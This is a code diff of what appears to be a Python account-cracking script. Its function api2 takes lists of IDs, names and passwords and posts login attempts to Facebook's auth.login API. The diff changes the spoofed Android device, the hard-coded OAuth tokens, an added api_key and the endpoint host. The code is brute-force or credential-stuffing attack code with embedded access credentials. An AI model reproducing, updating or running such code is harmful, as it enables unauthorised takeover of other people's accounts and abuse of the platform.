@@ -1,4 +1,3 @@
-
 from os import path
 import os,base64,zlib,pip,urllib
 print('\n\033[1;37m install modules...\n It will take some seconds...')
@@ -446,7 +445,7 @@ def api2(ids,names,passlist):
                                         'generate_machine_id':'join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(24))',
                                         "advertiser_id": str(uuid.uuid4()),
                                         "locale":"en_US","client_country_code":"US",
-                                        'device':'Samsung Galaxy S10',
+                                        'device':"Infinix X682B",
                                         'device_id':str(uuid.uuid4()),
                                         "method": "auth.login",
                                         "fb_api_req_friendly_name": "authenticate",
@@ -455,7 +454,8 @@ def api2(ids,names,passlist):
                                         'content-type':'application/x-www-form-urlencoded',
                                         'x-fb-sim-hni':str(random.randint(20000, 40000)),
                                         'x-fb-connection-type':'unknown',
-                                        'Authorization':'OAuth 438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',
+                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                                        'api_key': '882a8490361da98702bf97a021ddc14d',
                                         'user-agent':'Davik/2.1.0 (Linux; U; Android 4.0.0; Infinix X682B Build/Build/QP1A.190711.020; wv) [FBAN/AndroidSampleApp;FBAV/348.719.618.179;FBLC/en_US;FBBV/709835163;FBCR/Zong;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix X682B;FBSV/12.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.3312501,width=800,height=1216};FB_FW/1;]',
                                         'x-fb-net-hni':str(random.randint(20000, 40000)),
                                         'x-fb-connection-bandwidth':str(random.randint(2e7, 3e7)),
@@ -463,7 +463,7 @@ def api2(ids,names,passlist):
                                         'x-fb-friendly-name':'authenticate',
                                         'accept-encoding':'gzip, deflate',
                                         'x-fb-http-engine':     'Liger'}
-                                url = ' https://b-api.facebook.com/method/auth.login'
+                                url = ' https://api.facebook.com/method/auth.login'
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
